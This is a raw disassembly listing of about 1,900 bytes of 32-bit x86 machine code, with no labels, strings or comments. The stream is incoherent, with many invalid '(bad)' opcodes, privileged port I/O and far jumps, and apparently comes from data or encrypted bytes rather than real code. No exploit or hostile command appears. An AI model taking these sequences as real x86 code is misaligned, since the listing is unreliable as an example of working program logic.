  49a52f:	sub    ebp,esi
  49a531:	retf   0x5886
  49a534:	pop    ss
  49a535:	mov    eax,0xed7b041b
  49a53a:	fstp   DWORD PTR [ebp-0x7aee8354]
  49a540:	(bad)  [eax+0x7e3f136c]
  49a546:	push   ss
  49a547:	(bad)  
  49a548:	aaa    
  49a549:	in     al,dx
  49a54a:	adc    DWORD PTR [eax],eax
  49a54c:	adc    edx,DWORD PTR [edx]
  49a54e:	xchg   ebx,eax
  49a54f:	(bad)  
  49a550:	mov    edx,0x1c13c3e4
  49a555:	push   ds
  49a556:	xor    bl,BYTE PTR [ebx-0x1cf427d3]
  49a55c:	xor    DWORD PTR [edi+0x3827ad65],0xffffff80
  49a563:	les    eax,FWORD PTR [esi-0x40]
  49a566:	jecxz  0x49a56c
  49a568:	sub    DWORD PTR [edx-0x7a],ebx
  49a56b:	xor    eax,0x451a10f4
  49a570:	and    BYTE PTR [ebp+edx*1-0x35],al
  49a574:	adc    eax,0x194446c2
  49a579:	jmp    0x60464ddd
  49a57e:	jb     0x49a548
  49a580:	out    0x6f,eax
  49a582:	mov    ecx,DWORD PTR [edi]
  49a584:	mov    al,0x30
  49a586:	pop    es
  49a587:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a588:	ins    BYTE PTR es:[edi],dx
  49a589:	mov    esp,DWORD PTR [ecx]
  49a58b:	mov    esp,0xb3079f24
  49a590:	xor    BYTE PTR [eax],ch
  49a592:	bswap  ecx
  49a594:	and    eax,0x5f9146c7
  49a599:	or     BYTE PTR [ebx-0x1a7ee592],al
  49a59f:	mov    ds:0x60820d5,eax
  49a5a4:	out    dx,al
  49a5a5:	mov    WORD PTR [edx],?
  49a5a7:	shr    esp,1
  49a5a9:	dec    edi
  49a5aa:	push   0xb
  49a5ac:	push   0x30da5900
  49a5b1:	fsincos 
  49a5b3:	ret    
  49a5b4:	cmc    
  49a5b5:	test   eax,0x3c60d81
  49a5ba:	add    DWORD PTR [ebx],eax
  49a5bc:	sub    bh,BYTE PTR [esi]
  49a5be:	push   0xd
  49a5c0:	push   0x89924518
  49a5c5:	std    
  49a5c6:	call   0x4301:0x43c60e41
  49a5cd:	xor    al,0x2f
  49a5cf:	in     al,0x1
  49a5d1:	cdq    
  49a5d2:	add    dl,BYTE PTR [esi]
  49a5d4:	push   0x8d6058
  49a5d9:	ds dec ebx
  49a5db:	sar    BYTE PTR [esi+0x2c],0xbb
  49a5df:	lock pushf 
  49a5e1:	adc    dh,al
  49a5e3:	jge    0x49a5cf
  49a5e5:	cmp    ebx,DWORD PTR [ebx+0xb]
  49a5e8:	mov    bh,0x15
  49a5ea:	sbb    DWORD PTR [ecx],edx
  49a5ec:	fistp  DWORD PTR [edi]
  49a5ee:	and    dh,BYTE PTR [ebp+0x19]
  49a5f1:	xor    ecx,ecx
  49a5f3:	push   eax
  49a5f4:	add    dl,BYTE PTR [edi+0x41]
  49a5f7:	adc    ch,BYTE PTR [eax]
  49a5f9:	clc    
  49a5fa:	repnz dec ebp
  49a5fc:	push   edi
  49a5fd:	push   edi
  49a5fe:	jmp    0x49a601
  49a600:	pop    bx
  49a602:	xor    bl,0xfd
  49a605:	outs   dx,DWORD PTR ds:[esi]
  49a606:	dec    edx
  49a607:	inc    edx
  49a608:	or     BYTE PTR [ebx+0x6dd0ffcb],cl
  49a60e:	fsubr  DWORD PTR [ebx]
  49a610:	adc    bh,bh
  49a612:	inc    edx
  49a613:	push   cs
  49a614:	mov    BYTE PTR [ecx+edi*1+0x43],cl
  49a618:	and    BYTE PTR [edi],cl
  49a61a:	xchg   BYTE PTR [edx+0x4a0ce20a],bl
  49a620:	outs   dx,BYTE PTR ds:[esi]
  49a621:	dec    ebx
  49a622:	mov    cl,0x20
  49a624:	sub    al,dh
  49a626:	mov    dh,0x30
  49a628:	xchg   esp,eax
  49a629:	push   eax
  49a62a:	imul   edx,DWORD PTR fs:[ebp-0x1eef9657],0x2ea2508f
  49a635:	or     ecx,eax
  49a637:	push   ss
  49a638:	and    BYTE PTR [ebx+0x6d6c1b78],al
  49a63e:	dec    esp
  49a63f:	sahf   
  49a640:	shl    ah,0x3
  49a643:	inc    eax
  49a644:	das    
  49a645:	xor    al,0xfa
  49a647:	mov    ds:0x5c75b383,eax
  49a64c:	lea    eax,[ebp+0x4656800]
  49a652:	or     al,0xde
  49a654:	or     cl,BYTE PTR [esi+0x10]
  49a657:	push   ecx
  49a658:	push   ebx
  49a659:	dec    edi
  49a65a:	adc    al,0x16
  49a65c:	jo     0x49a631
  49a65e:	xchg   ebx,eax
  49a65f:	jmp    0x972a:0x7502fc3c
  49a666:	add    eax,0x8d9e55b8
  49a66b:	xchg   ebp,eax
  49a66c:	aas    
  49a66d:	push   ebp
  49a66e:	adc    BYTE PTR [ebx],bh
  49a670:	add    ebx,ecx
  49a672:	pop    ss
  49a673:	out    dx,eax
  49a674:	and    edi,DWORD PTR [edi+edi*8+0x331a120c]
  49a67b:	xchg   ebp,eax
  49a67c:	mov    eax,0xa46856b5
  49a681:	pop    ecx
  49a682:	sahf   
  49a683:	rcl    BYTE PTR [esi-0xbac4ee2],0x9f
  49a68a:	punpckhbw mm2,mm0
  49a68d:	pop    eax
  49a68e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49a68f:	jo     0x49a6d3
  49a691:	je     0x49a6ab
  49a693:	or     dh,al
  49a695:	daa    
  49a696:	rcr    BYTE PTR [esi],0x34
  49a699:	nop
  49a69a:	shr    BYTE PTR [edx+0x5008a657],1
  49a6a0:	fdivrp st(2),st
  49a6a2:	add    edx,esp
  49a6a4:	push   esi
  49a6a5:	ins    BYTE PTR es:[edi],dx
  49a6a6:	mov    eax,0x6f813b9
  49a6ab:	in     eax,dx
  49a6ac:	push   0xcb07ff7b
  49a6b1:	pushf  
  49a6b2:	xchg   edx,eax
  49a6b3:	stos   DWORD PTR es:[edi],eax
  49a6b4:	cmp    eax,0x7451a395
  49a6b9:	cmp    eax,0x3ec4cf62
  49a6be:	xchg   edx,eax
  49a6bf:	cmp    BYTE PTR [edx+0x4f],bl
  49a6c2:	adc    al,0x54
  49a6c4:	daa    
  49a6c5:	mov    dh,0x0
  49a6c7:	icebp  
  49a6c8:	jne    0x49a73f
  49a6ca:	xchg   esp,eax
  49a6cb:	mov    dl,0x48
  49a6cd:	stc    
  49a6ce:	jg     0x49a659
  49a6d0:	imul   eax,DWORD PTR [edi],0xff7d1a6c
  49a6d6:	and    dh,ah
  49a6d8:	jne    0x49a6c1
  49a6da:	xchg   DWORD PTR [edi],ecx
  49a6dc:	loopne 0x49a72d
  49a6de:	mov    ah,0xf
  49a6e0:	mov    fs,WORD PTR [ebp+0x240742]
  49a6e6:	and    esp,DWORD PTR ds:0xc0f8c405
  49a6ec:	add    BYTE PTR [eax-0x16],bh
  49a6ef:	push   0xffffffe4
  49a6f1:	push   ds
  49a6f2:	jl     0x49a6a1
  49a6f4:	mov    ds:0xf08c84f0,eax
  49a6f9:	push   es
  49a6fa:	inc    ecx
  49a6fb:	and    BYTE PTR ds:0x84322099,dh
  49a701:	sub    al,0xa6
  49a703:	je     0x49a745
  49a705:	add    BYTE PTR [edi],0xc4
  49a708:	clc    
  49a709:	and    edi,ebp
  49a70b:	inc    edi
  49a70c:	push   esi
  49a70d:	stc    
  49a70e:	push   es
  49a70f:	adc    bh,BYTE PTR [eax]
  49a711:	(bad)  
  49a712:	(bad)  
  49a715:	and    al,0x4e
  49a717:	pusha  
  49a718:	nop
  49a719:	retf   
  49a71a:	fnstsw WORD PTR [ebx+edx*2-0x6b3893d]
  49a721:	ds int 0xdd
  49a724:	mov    ch,0x3
  49a726:	dec    ebx
  49a727:	add    al,0x1c
  49a729:	jle    0x49a6ca
  49a72b:	adc    DWORD PTR [ecx-0x78],edx
  49a72e:	shl    dl,0xf
  49a731:	mov    DWORD PTR [ebx],ecx
  49a733:	ins    DWORD PTR es:[edi],dx
  49a734:	fsubr  st(1),st
  49a736:	jbe    0x49a6e1
  49a738:	xchg   ecx,eax
  49a739:	fdiv   QWORD PTR [edi]
  49a73b:	mov    ecx,0xf3f88385
  49a740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49a741:	nop
  49a742:	sbb    BYTE PTR ds:0x485e400d,0xc0
  49a749:	ins    BYTE PTR es:[edi],dx
  49a74a:	cmp    bh,BYTE PTR [esi+eiz*4+0x62]
  49a74e:	pop    es
  49a74f:	add    ah,bh
  49a751:	std    
  49a752:	push   ds
  49a753:	test   BYTE PTR [eax],al
  49a755:	imul   eax,DWORD PTR [ebx+0x524f243f],0x65
  49a75c:	inc    edi
  49a75d:	gs pop ss
  49a75f:	push   eax
  49a760:	push   edx
  49a761:	xchg   BYTE PTR [eax-0x9],cl
  49a764:	push   edx
  49a765:	dec    esp
  49a766:	mov    esp,0x52038b17
  49a76b:	js     0x49a799
  49a76d:	mov    DWORD PTR [eax],ebp
  49a76f:	jae    0x49a779
  49a771:	inc    ecx
  49a772:	push   cs
  49a773:	push   ebp
  49a774:	or     eax,ecx
  49a776:	adc    edx,DWORD PTR [edx+0x44]
  49a779:	jle    0x49a76b
  49a77b:	add    al,0x33
  49a77d:	sub    eax,0x3b88078a
  49a782:	add    dh,BYTE PTR [ebx]
  49a784:	or     eax,0x510f86cd
  49a789:	(bad)  [eax-0x3f]
  49a78c:	push   esi
  49a78d:	lea    ebp,[eax+0x4d1a699f]
  49a793:	(bad)  
  49a794:	ror    edi,cl
  49a796:	xchg   esi,eax
  49a797:	or     BYTE PTR [edx],bl
  49a799:	(bad)  
  49a79a:	or     cl,BYTE PTR [ecx-0x46fde1f8]
  49a7a0:	lods   eax,DWORD PTR ds:[esi]
  49a7a1:	mul    BYTE PTR [esi]
  49a7a3:	or     eax,0x89dc3150
  49a7a8:	push   cs
  49a7a9:	push   es
  49a7aa:	js     0x49a7c9
  49a7ac:	pushf  
  49a7ad:	cmp    al,BYTE PTR [edx-0x76a2ad9a]
  49a7b3:	test   bl,dl
  49a7b5:	(bad)  
  49a7b7:	adc    BYTE PTR [ecx-0x3665b0ff],al
  49a7bd:	add    al,0x22
  49a7bf:	jmp    0x49a83d
  49a7c1:	loop   0x49a7ca
  49a7c3:	adc    al,0x1b
  49a7c5:	cwde   
  49a7c6:	cmp    al,0x72
  49a7c8:	mov    WORD PTR [esi],es
  49a7ca:	clc    
  49a7cb:	ins    BYTE PTR es:[edi],dx
  49a7cc:	cmp    BYTE PTR [ebx+edx*1],bh
  49a7cf:	and    ebx,DWORD PTR [esi+0x1ac243e6]
  49a7d5:	pushf  
  49a7d6:	mov    eax,ds:0x8c0eb241
  49a7db:	jnp    0x170cc411
  49a7e1:	in     al,dx
  49a7e2:	ss push edi
  49a7e4:	lea    ebx,[edi-0x71]
  49a7e7:	repnz popa 
  49a7e9:	aaa    
  49a7ea:	cmp    eax,esi
  49a7ec:	xor    BYTE PTR [ebp-0x7d],ch
  49a7ef:	ds mov esi,ds
  49a7f2:	xor    BYTE PTR [edi+0x604fc93],bl
  49a7f8:	mov    ecx,DWORD PTR [ebx]
  49a7fa:	push   eax
  49a7fb:	push   ecx
  49a7fc:	mov    bh,0x30
  49a7fe:	adc    edx,DWORD PTR [edx+0x6]
  49a801:	xchg   edi,eax
  49a802:	nop
  49a803:	daa    
  49a804:	add    edx,DWORD PTR [eax-0x65]
  49a807:	jns    0x49a80f
  49a809:	cs enter 0xf0f,0x8b
  49a80e:	push   ss
  49a80f:	push   edx
  49a810:	cmp    DWORD PTR [edx],eax
  49a812:	inc    esp
  49a813:	add    ebx,edx
  49a815:	lock pcmpeqw mm1,QWORD PTR [esi]
  49a819:	xchg   BYTE PTR [esi+eax*4+0x66],ah
  49a81d:	inc    ebp
  49a81e:	push   cs
  49a81f:	add    BYTE PTR [ebp+0x26],dh
  49a822:	push   cs
  49a823:	and    eax,0x7f48de18
  49a828:	jae    0x49a803
  49a82a:	in     al,0x81
  49a82c:	loope  0x49a863
  49a82e:	jno    0x49a7bf
  49a830:	mov    ecx,DWORD PTR [esi]
  49a832:	out    dx,eax
  49a833:	mov    fs:0x9e3302f1,al
  49a839:	jo     0x49a8ab
  49a83b:	mov    ds:0x58882f81,al
  49a840:	adc    al,0x51
  49a842:	addr16 jbe 0x49a7ec
  49a845:	addr16 pop edx
  49a847:	sbb    ecx,DWORD PTR ds:0x3c4835aa
  49a84d:	pop    edi
  49a84e:	xor    DWORD PTR [eax],0xffffffc2
  49a851:	jmp    0x49a7e2
  49a853:	sub    ch,dh
  49a855:	lock adc BYTE PTR [ecx+0x5e067fc9],al
  49a85c:	inc    ecx
  49a85d:	mov    ?,WORD PTR [edi-0x6df6a0d4]
  49a863:	push   ecx
  49a864:	cmp    al,bl
  49a866:	sbb    BYTE PTR [edx+edx*2-0x6bda537b],al
  49a86d:	and    bh,BYTE PTR [esp+eiz*2]
  49a870:	xor    al,0xe
  49a872:	adc    ah,BYTE PTR [esi]
  49a874:	loope  0x49a8b6
  49a876:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49a877:	push   ebp
  49a878:	sub    BYTE PTR [edi+0x52],0xf7
  49a87c:	jle    0x49a8e8
  49a87e:	push   ss
  49a87f:	xchg   ebx,eax
  49a880:	scas   al,BYTE PTR es:[edi]
  49a881:	and    DWORD PTR [ecx+0x48b6b137],eax
  49a887:	add    al,0xb1
  49a889:	dec    edi
  49a88a:	add    BYTE PTR [ebp+0x4],bh
  49a88d:	inc    edx
  49a88e:	xchg   esp,eax
  49a88f:	cli    
  49a890:	pop    es
  49a891:	sub    DWORD PTR [ebx],ecx
  49a893:	loopne 0x49a82e
  49a895:	push   es
  49a896:	or     cl,BYTE PTR [esi+0x45ffe643]
  49a89c:	mov    al,ds:0xbe408003
  49a8a1:	sbb    BYTE PTR [eax],ah
  49a8a3:	add    al,0x90
  49a8a5:	sbb    BYTE PTR [ecx-0x72cdec44],bl
  49a8ab:	and    bl,BYTE PTR [edi+0x7811080e]
  49a8b1:	pop    eax
  49a8b2:	sub    al,0xd5
  49a8b4:	inc    esp
  49a8b5:	mov    edi,0xa646cf09
  49a8ba:	push   es
  49a8bb:	or     DWORD PTR [esp+eax*1-0x7d],0x3c
  49a8c0:	mov    ebx,0xf317400
  49a8c5:	add    BYTE PTR [esi],ch
  49a8c7:	adc    eax,0x4365ac5
  49a8cc:	cmp    al,0x64
  49a8ce:	loopne 0x49a851
  49a8d0:	mov    ebx,0xb99d74fc
  49a8d5:	outs   dx,DWORD PTR ds:[esi]
  49a8d6:	dec    ebx
  49a8d7:	cmp    BYTE PTR [eax-0x1445fb77],0x14
  49a8de:	pop    ss
  49a8df:	adc    BYTE PTR ds:0x2972a209,0x2
  49a8e6:	push   ss
  49a8e7:	mov    eax,0x2fc48406
  49a8ec:	add    eax,0x5fb87c60
  49a8f1:	pop    ebx
  49a8f2:	repz cli 
  49a8f4:	loope  0x49a967
  49a8f6:	push   0x7f52bf77
  49a8fb:	mov    edi,0x457cbc39
  49a900:	out    0x1b,eax
  49a902:	mov    edi,0x2c103465
  49a907:	lods   al,BYTE PTR ds:[esi]
  49a908:	pop    ebp
  49a909:	adc    al,0xe3
  49a90b:	sbb    esp,edx
  49a90d:	in     eax,0x6c
  49a90f:	jmp    0x525f0852
  49a914:	push   es
  49a915:	jle    0x49a963
  49a917:	adc    BYTE PTR [ecx],al
  49a919:	mov    BYTE PTR ds:0x104c5be8,0xdf
  49a920:	dec    eax
  49a921:	dec    ebx
  49a922:	or     esi,DWORD PTR [esp+eax*4]
  49a925:	and    ebx,DWORD PTR [ecx]
  49a927:	in     al,0x10
  49a929:	adc    esp,edi
  49a92b:	sub    DWORD PTR [edx],edx
  49a92d:	push   ss
  49a92e:	rol    BYTE PTR [ecx],0x8c
  49a931:	or     ebx,DWORD PTR ds:0x70180742
  49a937:	nop
  49a938:	sub    eax,0x3771006a
  49a93d:	add    eax,0xa3015872
  49a942:	push   esp
  49a943:	or     ah,cl
  49a945:	jle    0x49a976
  49a947:	sti    
  49a948:	leave  
  49a949:	xor    DWORD PTR [ecx+0x14],0x325cbe51
  49a950:	adc    eax,0xef0e4413
  49a955:	jmp    0x49a9cc
  49a957:	sub    al,0x1
  49a959:	mov    bh,0xa9
  49a95b:	aas    
  49a95c:	jg     0x49a932
  49a95e:	dec    esp
  49a95f:	adc    bh,bl
  49a961:	or     DWORD PTR [eax],edx
  49a963:	fs push esi
  49a965:	push   ecx
  49a966:	popf   
  49a967:	add    DWORD PTR [ebp-0x7e],ebx
  49a96a:	or     edi,DWORD PTR ds:0xdb0fcc9f
  49a970:	shr    BYTE PTR [ecx-0x28],cl
  49a973:	or     edx,edi
  49a975:	adc    BYTE PTR [edi+0x4399b501],ah
  49a97b:	jmp    0xc5c82daf
  49a980:	jp     0x49a9d3
  49a982:	jmp    0x49a99f
  49a984:	pop    esp
  49a985:	(bad)  
  49a986:	dec    esi
  49a987:	add    ebp,DWORD PTR [edi+0x52]
  49a98a:	push   edx
  49a98b:	push   0x7b
  49a98d:	push   eax
  49a98e:	mov    al,BYTE PTR [edx+eax*4+0x3f]
  49a992:	cmp    al,0x90
  49a994:	sub    ecx,DWORD PTR [esi+0x7b]
  49a997:	push   edx
  49a998:	(bad)  
  49a999:	in     al,dx
  49a99a:	mov    ch,0xe9
  49a99c:	jl     0x49a9f6
  49a99e:	nop
  49a99f:	and    DWORD PTR [edx],0xc
  49a9a2:	aaa    
  49a9a3:	add    al,0xf4
  49a9a5:	lea    edx,[ebp+0x693c0469]
  49a9ab:	test   DWORD PTR ss:[edx+0x49],edx
  49a9af:	ds inc esi
  49a9b1:	aaa    
  49a9b2:	xor    edx,ebx
  49a9b4:	or     DWORD PTR [eax],ecx
  49a9b6:	aas    
  49a9b7:	lds    esp,FWORD PTR [ecx]
  49a9b9:	dec    edi
  49a9ba:	idiv   DWORD PTR [ebx+0x297e835a]
  49a9c0:	add    BYTE PTR [esi+0x67],dl
  49a9c3:	or     eax,0xf083c0d1
  49a9c8:	mov    ebx,0x8dec74a
  49a9cd:	loopne 0x49aa2c
  49a9cf:	ficom  DWORD PTR cs:[ebx]
  49a9d2:	(bad)  
  49a9d4:	cmp    ebx,edx
  49a9d6:	jne    0x49a9aa
  49a9d8:	push   es
  49a9d9:	outs   dx,BYTE PTR ds:[esi]
  49a9da:	adc    esp,ebx
  49a9dc:	inc    edx
  49a9dd:	js     0x49a9e6
  49a9df:	or     eax,0x4541118c
  49a9e4:	clc    
  49a9e5:	mov    bl,0xd2
  49a9e7:	popf   
  49a9e8:	call   0xa385:0x87ba7a9f
  49a9ef:	test   al,0x63
  49a9f1:	or     edx,DWORD PTR [ebx]
  49a9f3:	mov    ebp,0x1a86360f
  49a9f8:	mov    ebx,0xfbdb2076
  49a9fd:	pop    ds
  49a9fe:	dec    eax
  49a9ff:	push   edi
  49aa00:	mov    bl,al
  49aa02:	rdmsr  
  49aa04:	cmp    bl,al
  49aa06:	call   0xe459bc71
  49aa0b:	mov    ebp,0xd0660fd0
  49aa10:	jle    0x49aa73
  49aa12:	cdq    
  49aa13:	mov    BYTE PTR [eax+0x3f8b5ee4],0x85
  49aa1a:	dec    DWORD PTR [ecx+0x12d3c09f]
  49aa20:	push   ebx
  49aa21:	push   edi
  49aa22:	ficom  WORD PTR [ebx]
  49aa24:	rcl    DWORD PTR [ebp-0x40c32c7e],0x22
  49aa2b:	inc    ecx
  49aa2c:	aas    
  49aa2d:	push   eax
  49aa2e:	inc    eax
  49aa2f:	lods   eax,DWORD PTR ds:[esi]
  49aa30:	es es jne 0x49aa79
  49aa34:	mov    dh,0x41
  49aa36:	push   ss
  49aa37:	or     bh,ch
  49aa39:	imul   edx,DWORD PTR [ebp+0xe0fd821],0x100d7285
  49aa43:	mov    eax,0xdf5646f1
  49aa48:	xchg   ebx,eax
  49aa49:	push   esi
  49aa4a:	adc    bl,0x4
  49aa4d:	jge    0x49aa62
  49aa4f:	push   eax
  49aa50:	dec    eax
  49aa51:	or     DWORD PTR [ebp-0xc],ecx
  49aa54:	cdq    
  49aa55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49aa56:	div    ebx
  49aa58:	(bad)  
  49aa59:	lea    ebx,[ebp-0x20]
  49aa5c:	cmc    
  49aa5d:	(bad)  
  49aa5e:	out    dx,eax
  49aa5f:	aas    
  49aa60:	lods   al,BYTE PTR ds:[esi]
  49aa61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49aa62:	adc    dh,al
  49aa64:	sub    DWORD PTR [esi],eax
  49aa66:	push   0xffffffc0
  49aa68:	push   ebx
  49aa69:	or     edx,DWORD PTR [ebp-0x72080dd0]
  49aa6f:	push   ebp
  49aa70:	loopne 0x49aac4
  49aa72:	int    0x53
  49aa74:	mov    esi,eax
  49aa76:	lock shr BYTE PTR [edx],cl
  49aa79:	push   ebx
  49aa7a:	add    BYTE PTR [eax-0xd],0xa3
  49aa7e:	loopne 0x49aab2
  49aa80:	mov    cl,0x85
  49aa82:	or     BYTE PTR [ebx],0xc3
  49aa85:	push   ecx
  49aa86:	aam    0xeb
  49aa88:	ror    DWORD PTR [ebx+eax*4-0x43],0x73
  49aa8d:	icebp  
  49aa8e:	fisub  WORD PTR [edx-0x3a]
  49aa91:	pop    eax
  49aa92:	push   ds
  49aa93:	in     al,dx
  49aa94:	push   edx
  49aa95:	ret    
  49aa96:	jns    0x49aa22
  49aa98:	ret    
  49aa99:	cmp    al,0x4d
  49aa9b:	xor    BYTE PTR [eax],0x12
  49aa9e:	mov    eax,0x9c35d7db
  49aaa3:	sbb    cl,BYTE PTR [ecx]
  49aaa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49aaa6:	int3   
  49aaa7:	add    ecx,DWORD PTR ds:0x70804708
  49aaad:	ror    BYTE PTR [ebx-0x728790b7],cl
  49aab3:	les    eax,FWORD PTR [ecx]
  49aab5:	mov    ds:0x23331fb2,eax
  49aaba:	pop    ebp
  49aabb:	push   cs
  49aabc:	inc    eax
  49aabd:	pop    ebx
  49aabe:	pop    edi
  49aabf:	xchg   edx,eax
  49aac0:	ins    DWORD PTR es:[edi],dx
  49aac1:	ret    0x497b
  49aac4:	ror    BYTE PTR [ebx+0x6715d253],0xac
  49aacb:	sbb    al,0x1
  49aacd:	jmp    0x8f08:0xd48b8672
  49aad4:	(bad)  
  49aad5:	sti    
  49aad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49aad7:	or     ecx,DWORD PTR [ebx+0x5b0f1052]
  49aadd:	mov    esi,0x53047bae
  49aae2:	cmp    ecx,DWORD PTR ds:0x237a6d52
  49aae8:	push   edx
  49aae9:	xchg   edx,eax
  49aaea:	les    ecx,FWORD PTR [ecx]
  49aaec:	adc    BYTE PTR [edx],ah
  49aaee:	fdivr  DWORD PTR [edx+0x43feb74b]
  49aaf4:	or     BYTE PTR [ebx+0x71],cl
  49aaf7:	pop    ebp
  49aaf8:	cmp    eax,0xc2011572
  49aafd:	push   cs
  49aafe:	inc    eax
  49aaff:	xchg   ecx,eax
  49ab00:	dec    ebx
  49ab01:	cs jl  0x49ab38
  49ab04:	pop    ecx
  49ab05:	jne    0x49ab21
  49ab07:	(bad)  
  49ab08:	push   ds
  49ab09:	out    dx,al
  49ab0a:	jnp    0x49ab11
  49ab0c:	daa    
  49ab0d:	xchg   edx,eax
  49ab0e:	dec    ebx
  49ab0f:	and    ch,al
  49ab11:	ins    BYTE PTR es:[edi],dx
  49ab12:	test   al,0x2b
  49ab14:	xor    dl,BYTE PTR [esi]
  49ab16:	int3   
  49ab17:	rol    BYTE PTR [esi],cl
  49ab19:	push   ecx
  49ab1a:	xor    ebp,DWORD PTR [ecx]
  49ab1c:	div    BYTE PTR [esp+eax*8]
  49ab1f:	add    DWORD PTR [si+0x6752],ecx
  49ab24:	imul   esi,DWORD PTR es:[eax+0x68],0x5d338b2f
  49ab2c:	test   eax,0x386af0a9
  49ab31:	(bad)  
  49ab32:	out    dx,eax
  49ab33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ab34:	fldenv [ebx-0x7de92e27]
  49ab3a:	dec    esi
  49ab3b:	and    BYTE PTR [ebx],0x18
  49ab3e:	(bad)  
  49ab3f:	in     eax,dx
  49ab40:	mov    ah,0xd1
  49ab42:	push   es
  49ab43:	add    esp,DWORD PTR [eax]
  49ab45:	in     eax,dx
  49ab46:	xchg   ebp,eax
  49ab47:	sar    DWORD PTR [ebx],0x17
  49ab4a:	jge    0x49ab52
  49ab4c:	ins    BYTE PTR es:[edi],dx
  49ab4d:	pop    eax
  49ab4e:	lahf   
  49ab4f:	sbb    eax,0x5b9a099f
  49ab54:	push   ebx
  49ab55:	ins    DWORD PTR es:[edi],dx
  49ab56:	jae    0x49abc9
  49ab58:	jmp    0x43e:0x4e06c3a1
  49ab5f:	pop    ds
  49ab60:	or     al,0xb2
  49ab62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ab63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ab64:	push   0x387ff1fb
  49ab69:	dec    ecx
  49ab6a:	cwde   
  49ab6b:	in     al,0x92
  49ab6d:	clc    
  49ab6e:	call   0x96658236
  49ab73:	add    edx,DWORD PTR [ebx+eax*2]
  49ab76:	jge    0x49aafd
  49ab78:	das    
  49ab79:	pop    ebx
  49ab7a:	aam    0x87
  49ab7c:	sbb    eax,0xc6f760bb
  49ab81:	pusha  
  49ab82:	adc    dl,BYTE PTR [edx+0x7d]
  49ab85:	sub    eax,0xe8d90a6c
  49ab8a:	fdivrp st(2),st
  49ab8c:	(bad)  
  49ab8d:	call   0x21a9:0x968232fb
  49ab94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49ab95:	jo     0x49abd0
  49ab97:	clc    
  49ab98:	add    DWORD PTR [edi],eax
  49ab9a:	push   ss
  49ab9b:	fs push esi
  49ab9d:	call   0x4aa586
  49aba2:	adc    BYTE PTR [esi],bh
  49aba4:	add    DWORD PTR [edx-0x1ef9fa23],eax
  49abaa:	pop    es
  49abab:	mov    dl,0x82
  49abad:	fst    QWORD PTR [ebp-0xc]
  49abb0:	test   al,0x2c
  49abb2:	adc    al,0xc2
  49abb4:	jle    0x49abb7
  49abb6:	and    cl,bl
  49abb8:	loopne 0x49ab45
  49abba:	push   edx
  49abbb:	push   0x5d32ebe7
  49abc0:	sub    eax,0x77384ea9
  49abc5:	fisubr DWORD PTR [ecx-0x25]
  49abc8:	aam    0x35
  49abca:	jp     0x49ac04
  49abcc:	xchg   edx,eax
  49abcd:	pop    eax
  49abce:	and    DWORD PTR [esi-0x31],0xfffffff3
  49abd2:	mov    ch,0x33
  49abd4:	add    al,0x2
  49abd6:	add    BYTE PTR [ebp-0x57],ch
  49abd9:	cmc    
  49abda:	bound  ecx,QWORD PTR [esi]
  49abdc:	loopne 0x49ac36
  49abde:	jo     0x49ac4b
  49abe0:	stos   BYTE PTR es:[edi],al
  49abe1:	sbb    edi,DWORD PTR [esi+0x7414e196]
  49abe7:	daa    
  49abe8:	push   ebx
  49abe9:	ins    BYTE PTR es:[edi],dx
  49abea:	iret   
  49abeb:	xor    bl,BYTE PTR [esi]
  49abed:	or     BYTE PTR [eax-0x2],ch
  49abf0:	fcom   st(1)
  49abf2:	jecxz  0x49ac3b
  49abf4:	leave  
  49abf5:	mov    ah,BYTE PTR [eax-0x7d2703ea]
  49abfb:	loope  0x49abb6
  49abfd:	gs cld 
  49abff:	pop    esi
  49ac00:	test   al,0xfd
  49ac02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49ac03:	fcompp 
  49ac05:	xor    ebp,DWORD PTR [esi+0x35676465]
  49ac0b:	jmp    0x49ab94
  49ac0d:	in     eax,0x65
  49ac0f:	mov    eax,0xe708d982
  49ac14:	out    dx,eax
  49ac15:	push   ecx
  49ac16:	out    0x45,eax
  49ac18:	js     0x49abe2
  49ac1a:	xor    BYTE PTR [ebx],0x7
  49ac1d:	(bad)  
  49ac1e:	cld    
  49ac1f:	test   DWORD PTR [esp+esi*2],esp
  49ac22:	sbb    al,0x18
  49ac24:	mov    esp,0x26f53bc5
  49ac29:	sub    DWORD PTR [ebx+edx*4+0x6e0a6ce6],eax
  49ac30:	sub    BYTE PTR [ecx-0x56fec9d9],dh
  49ac36:	sub    DWORD PTR [ecx+0x3c],eax
  49ac39:	or     bl,bl
  49ac3b:	jae    0x49abc6
  49ac3d:	ret    0x2067
  49ac40:	or     cl,al
  49ac42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49ac43:	cmp    DWORD PTR [ebp+0x54b5a6be],ebx
  49ac49:	jo     0x49abec
  49ac4b:	lds    edi,FWORD PTR [edx-0x4418ea3c]
  49ac51:	jo     0x49abd9
  49ac53:	loop   0x49abf5
  49ac55:	or     DWORD PTR [ecx+eax*4-0x6d],edx
  49ac59:	rol    BYTE PTR [edi],0x5
  49ac5c:	or     dh,BYTE PTR [eax-0x6e]
  49ac5f:	mov    ecx,esi
  49ac61:	fisttp QWORD PTR [ebx]
  49ac63:	jnp    0x49ac7b
  49ac65:	jbe    0x49abe8
  49ac67:	shl    ah,0xfb
  49ac6a:	int    0xc
  49ac6c:	xchg   BYTE PTR [edi+0x2ebb755],dh
  49ac72:	jl     0x49ac47
  49ac74:	pusha  
  49ac75:	or     al,0x82
  49ac77:	xor    al,dh
  49ac79:	sub    eax,0x4d89857d
  49ac7e:	inc    eax
  49ac7f:	shl    DWORD PTR [edi+0x46082c70],cl
  49ac85:	into   
  49ac86:	not    DWORD PTR [eax]
  49ac88:	add    al,0xc7
  49ac8a:	or     esp,DWORD PTR [eax+0xf]
  49ac8d:	mov    edx,cs
  49ac8f:	and    esi,eax
